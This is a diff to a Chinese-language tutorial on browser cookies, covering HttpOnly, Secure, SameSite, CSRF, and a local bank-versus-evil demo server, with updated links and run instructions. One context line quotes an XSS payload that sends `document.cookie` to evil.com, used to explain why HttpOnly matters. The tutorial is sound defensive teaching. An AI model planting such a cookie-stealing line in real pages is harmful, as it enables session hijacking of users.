@@ -1,5 +1,7 @@
 # Cookie
 
+[返回存储目录](../README.md) · [仓库首页](../../../../README.md)
+
 > 浏览器保存的小段字符串数据，在满足 domain、path、secure、SameSite 等条件时自动附加到 HTTP 请求。它既是客户端存储，也参与 HTTP 状态管理，不能简单视为一个 JavaScript 键值数据库。
 
 ## 1. 写入与发送
@@ -43,7 +45,7 @@ Cookie: __Host-session=opaque-id
 
 脚本能通过 `document.cookie` 读取所有非 HttpOnly 的 Cookie。反射型或存储型 XSS 一旦执行，`new Image().src = "https://evil.com/?c=" + document.cookie` 就能把会话标识外传。
 
-`HttpOnly` 让会话 Cookie 对脚本不可见，直接切断这条窃取路径。但它只防"读"不防"用"：若 XSS 已能在页面中执行，攻击者仍可借用户现有会话在同源内发起请求（此时 Cookie 照常附带）。因此 HttpOnly 需与 CSP、输入输出转义、敏感操作二次校验等纵深防护配合，详见 [`xss.md`](../../../security/xss.md)。
+`HttpOnly` 让会话 Cookie 对脚本不可见，直接切断这条窃取路径。但它只防"读"不防"用"：若 XSS 已能在页面中执行，攻击者仍可借用户现有会话在同源内发起请求（此时 Cookie 照常附带）。因此 HttpOnly 需与 CSP、输入输出转义、敏感操作二次校验等纵深防护配合，详见 [MDN：XSS](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS)。
 
 ### Secure：防明文截获
 
@@ -61,7 +63,7 @@ CSRF 的前提是：受害浏览器向目标站点发请求时自动附带会话
 | `Lax`    | 只随顶级导航的安全方法（GET 等）发送；跨站 POST 表单和 img/fetch 等子资源一律不携带 |
 | `None`   | 不做限制，跨站照常携带，必须配合 `Secure`                                           |
 
-Lax 保留顶级 GET 导航是有意取舍：保证用户从外站点链接跳转过来仍是登录态。代价是，如果服务端在 GET 上做状态变更，Lax 也拦不住。完整 CSRF 攻击面见 [`csrf.md`](../../../security/csrf.md)。
+Lax 保留顶级 GET 导航是有意取舍：保证用户从外站点链接跳转过来仍是登录态。代价是，如果服务端在 GET 上做状态变更，Lax 也拦不住。完整 CSRF 攻击面见 [MDN：CSRF](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/CSRF)。
 
 关于 site 的判定，注意两点：
 
@@ -88,9 +90,21 @@ Lax 保留顶级 GET 导航是有意取舍：保证用户从外站点链接跳�
 | `legacy`   | `sid=…; Path=/; SameSite=None; Secure`          |
 | `hardened` | `sid=…; Path=/; Secure; HttpOnly; SameSite=Lax` |
 
+在仓库根目录使用 Node >= 22.18 运行，按 `Ctrl+C` 停止服务：
+
 ```bash
 node docs/browser/storage/cookie/index.ts
 ```
+
+CLI 仅在两个服务都监听成功后输出地址、操作步骤和观察方式；终端记录状态码、Cookie 携带与 Origin，浏览器 Network 用于查看 Cookie/Set-Cookie。两个服务都只监听本机，页面和重定向响应使用 `no-store`。
+
+默认端口被占用时可在仓库根目录切换，按 `Ctrl+C` 同时停止两个服务：
+
+```bash
+BANK_PORT=3002 EVIL_PORT=3003 node docs/browser/storage/cookie/index.ts
+```
+
+保持 bank 使用 localhost、evil 使用 127.0.0.1；端口改变不会改变这组跨站关系。浏览器策略也可能额外限制 Cookie，需结合实际请求判断。
 
 在 Chrome/Firefox 中打开 bank 首页登录一个变体，再到 evil 控制台依次执行四个攻击，然后换一个变体重复，对比结果：
 
@@ -147,7 +161,7 @@ document.cookie = ["theme=", "Max-Age=0", "Path=/", "SameSite=Lax", "Secure"].jo
 
 常见做法是把随机 session ID 放入 HttpOnly Cookie。把 access token 放在 `localStorage` 可避免浏览器自动携带，但同源 JavaScript 和成功执行的 XSS 可以读取它；放入 HttpOnly Cookie 可以阻止脚本直接读取，却需要设计 CSRF 防护。不存在脱离威胁模型的"绝对安全存储位置"。
 
-认证选型和完整攻击面见 [`sessionAndToken.md`](../../../auth/sessionAndToken.md) 与 [`sessionSecurity.md`](../../../security/sessionSecurity.md)。
+Cookie 在 HTTP 状态管理中的使用见 [MDN：Using HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies)。
 
 ## 8. 第三方 Cookie 与分区
 
